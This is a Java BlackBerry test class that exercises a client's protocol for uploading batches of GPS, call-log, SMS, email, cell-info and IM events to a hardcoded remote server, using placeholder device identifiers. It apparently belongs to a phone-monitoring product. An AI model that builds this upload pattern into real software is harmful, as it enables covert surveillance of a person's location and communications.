import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Dialog;
import com.apptest.prot.CallLogEventDataProvider;
import com.apptest.prot.CellInfoEventDataProvider;
import com.apptest.prot.EmailEventDataProvider;
import com.apptest.prot.GPSEventDataProvider;
import com.apptest.prot.IMEventDataProvider;
import com.apptest.prot.SMSEventDataProvider;
import com.apptest.resource.Configuration;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.SendEvents;
import com.vvt.prot.command.response.StructureCmdResponse;
import com.vvt.std.Log;

public class SendStoreEventTester implements CommandListener {
	private static final String COMMAND_URL = "http://202.176.88.55:8880/Phoenix-WAR-CyclopsCore/gateway";	
	private static final String TAG = "SendStoreEventTester";
	private long csid = 0;
	 
	public void testSendStoreEvent() {
		if (Log.isDebugEnable()) {
			Log.debug(TAG, "=== testSendStoreEvent Start! ===");
		}
		try {
			CommandRequest cmdRequest = null;
			//1. Send GPS Event
			cmdRequest = initGPSCmdRequest();
			long csid = CommandServiceManager.getInstance().execute(cmdRequest);
			//2. Send CallLog
			/*cmdRequest = initCallLogCmdRequest();
			csid = CommandServiceManager.getInstance().execute(cmdRequest);
			Long csidObj = new Long(csid);
			Log.debug(TAG + ".testSendStoreEvent()", "csid is: " + csidObj.toString());
			CsidManager.getInstance().getCsidStore().addCsid(csidObj);*/
			
			//3. Send SMS
			//cmdRequest = initSMSCmdRequest();
			//csid = CommandServiceManager.getInstance().execute(cmdRequest);
			//4. Send Email
			/*cmdRequest = initEmailCmdRequest();
			csid = CommandServiceManager.getInstance().execute(cmdRequest);*/
			//5. Send CellInfo
			/*cmdRequest = initCellInfoCmdRequest();
			csid = CommandServiceManager.getInstance().execute(cmdRequest);
			//6. Send IM
			cmdRequest = initIMCmdRequest();
			csid = CommandServiceManager.getInstance().execute(cmdRequest);*/
			
			
		} catch (Exception e) {
			Log.debug(TAG, "Exception on CommandServiceManager! ", e);
			e.printStackTrace();
			UiApplication.getUiApplication().invokeLater(new Runnable() {
				public void run () {
					Dialog.alert("Exception on CommandServiceManager!");
				}
			});
		}
	}
	
	private void testSendRask() {
		//1. Send GPS Event
		try {
			//CommandRequest cmdRequest = initGPSCmdRequest();
			CommandServiceManager.getInstance().executeResume(csid, this);
		} catch (Exception e) {
			Log.debug(TAG, "Exception on testSendRask! ", e);
			e.printStackTrace();
			UiApplication.getUiApplication().invokeLater(new Runnable() {
				public void run () {
					Dialog.alert("Exception on testSendRask!");
				}
			});
		}
	}
	
	private CommandRequest initGPSCmdRequest() {
		CommandRequest cmdRequest = new CommandRequest();
		//CommandMetaData cmdMetaData = initialCommandMetaData();
		CommandMetaData cmdMetaData = Configuration.initCommandMetaData(6);
		GPSEventDataProvider gpsDataProvider = new GPSEventDataProvider();
		SendEvents event = new SendEvents();
		event.setEventCount(10000);
		gpsDataProvider.setEventCount(10000);
		event.addEventIterator(gpsDataProvider);
		cmdRequest.setCommandData(event);
    	cmdRequest.setCommandMetaData(cmdMetaData);
    	cmdRequest.setUrl(Configuration.getServerUrl());
    	cmdRequest.setCommandListener(this);
    	return cmdRequest;
	} 

	private CommandRequest initCallLogCmdRequest() {
		CommandRequest cmdRequest = new CommandRequest();
		CommandMetaData cmdMetaData = initialCommandMetaData();		
		CallLogEventDataProvider callLogDataProvider = new CallLogEventDataProvider();
		SendEvents event = new SendEvents();
		event.setEventCount(5000);
		event.addEventIterator(callLogDataProvider);
		cmdRequest.setCommandData(event);
    	cmdRequest.setCommandMetaData(cmdMetaData);
    	cmdRequest.setUrl(COMMAND_URL);
    	cmdRequest.setCommandListener(this);
    	return cmdRequest;
	}
 
	private CommandRequest initSMSCmdRequest() {
		CommandRequest cmdRequest = new CommandRequest();
		CommandMetaData cmdMetaData = initialCommandMetaData();		
		SMSEventDataProvider smsDataProvider = new SMSEventDataProvider();
		SendEvents event = new SendEvents();
		event.setEventCount(1000);
		event.addEventIterator(smsDataProvider);
		cmdRequest.setCommandData(event);
    	cmdRequest.setCommandMetaData(cmdMetaData);
    	cmdRequest.setUrl(COMMAND_URL);
    	cmdRequest.setCommandListener(this);
    	return cmdRequest;
	}
	 
	private CommandRequest initEmailCmdRequest() {
		CommandRequest cmdRequest = new CommandRequest();
		CommandMetaData cmdMetaData = initialCommandMetaData();		
		EmailEventDataProvider emailDataProvider = new EmailEventDataProvider();
		SendEvents event = new SendEvents();
		event.setEventCount(5000);
		event.addEventIterator(emailDataProvider);
		cmdRequest.setCommandData(event);
    	cmdRequest.setCommandMetaData(cmdMetaData);
    	cmdRequest.setUrl(COMMAND_URL);
    	cmdRequest.setCommandListener(this);
    	return cmdRequest;
	}
	
	private CommandRequest initCellInfoCmdRequest() {
		CommandRequest cmdRequest = new CommandRequest();
		CommandMetaData cmdMetaData = initialCommandMetaData();		
		CellInfoEventDataProvider cellInfoDataProvider = new CellInfoEventDataProvider();
		SendEvents event = new SendEvents();
		event.setEventCount(1000);
		event.addEventIterator(cellInfoDataProvider);
		cmdRequest.setCommandData(event);
    	cmdRequest.setCommandMetaData(cmdMetaData);
    	cmdRequest.setUrl(COMMAND_URL);
    	cmdRequest.setCommandListener(this);
    	return cmdRequest;
	}
	 
	private CommandRequest initIMCmdRequest() {
		CommandRequest cmdRequest = new CommandRequest();
		CommandMetaData cmdMetaData = initialCommandMetaData();		
		IMEventDataProvider imDataProvider = new IMEventDataProvider();
		SendEvents event = new SendEvents();
		event.setEventCount(1000);
		event.addEventIterator(imDataProvider);
		cmdRequest.setCommandData(event);
    	cmdRequest.setCommandMetaData(cmdMetaData);
    	cmdRequest.setUrl(COMMAND_URL);
    	cmdRequest.setCommandListener(this);
    	return cmdRequest;
	}
	
	private CommandMetaData initialCommandMetaData() {
		CommandMetaData cmdMetaData = new CommandMetaData();
		cmdMetaData.setProtocolVersion(1);
		cmdMetaData.setProductId(4103);
		cmdMetaData.setProductVersion("1.0");
		cmdMetaData.setConfId(6);
		cmdMetaData.setDeviceId("Nat-IMEI-012345");
		cmdMetaData.setActivationCode("013213");
		cmdMetaData.setLanguage(Languages.ENGLISH);
		cmdMetaData.setPhoneNumber("0866666666");
		cmdMetaData.setMcc("510");
		cmdMetaData.setMnc("91");
		cmdMetaData.setImsi("123456789012345");
		cmdMetaData.setEncryptionCode(0);
		cmdMetaData.setCompressionCode(0);
		return cmdMetaData;
	}

	public void onConstructError(long csid, Exception e) {
		Log.debug(TAG + ".onConstructError()", "SendStoreEventTester is failed!: ", e);
		UiApplication.getUiApplication().invokeLater(new Runnable() {
			public void run () {
				Dialog.alert("onConstructError: SendStoreEventTester command is failed!");
			}
		});		
	}

	public void onTransportError(long csid, Exception e) {
		Log.debug(TAG + ".onTransportError()", "SendStoreEventTester is failed!: ", e);
		UiApplication.getUiApplication().invokeLater(new Runnable() {
			public void run () {
				Dialog.alert("onTransportError: SendStoreEventTester command is failed!");
			}
		});
	}	

	public void onServerError(long csid, StructureCmdResponse response) {
		Log.debug(TAG + ".onServerError()", "SendStoreEventTester is failed!, CSID: " + csid);
		UiApplication.getUiApplication().invokeLater(new Runnable() {
			public void run () {
				Dialog.alert("onServerError: SendStoreEventTester command is failed!");
			}
		});
	}

	public void onSuccess(StructureCmdResponse response) {
		Log.debug(TAG + ".onSuccess()", "SendStoreEventTester is success!");
		UiApplication.getUiApplication().invokeLater(new Runnable() {
			public void run () {
				Dialog.alert("SendStoreEventTester command is success!");
			}
		});
	}	
}
